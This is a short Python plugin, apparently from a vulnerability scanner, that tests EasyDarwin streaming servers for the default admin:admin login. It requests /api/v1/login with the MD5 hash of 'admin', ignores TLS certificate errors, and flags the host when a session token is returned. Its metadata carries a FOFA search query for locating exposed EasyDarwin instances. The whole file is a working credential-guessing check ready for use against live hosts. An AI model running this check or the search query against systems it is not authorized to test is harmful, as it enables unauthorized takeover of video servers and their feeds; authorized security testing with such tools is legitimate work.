#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'EasyDarwin弱口令',

      'level'     :   'high',

      'FOFA'      :   'title="EasyDarwin"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2023/12/5',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/v1/login?username=admin&password=21232f297a57a5a743894a0e4a801fc3&_=1701843630048'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'"token":.*?',res.text,re.S):
      ret['huixian'] = "admin:admin"
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret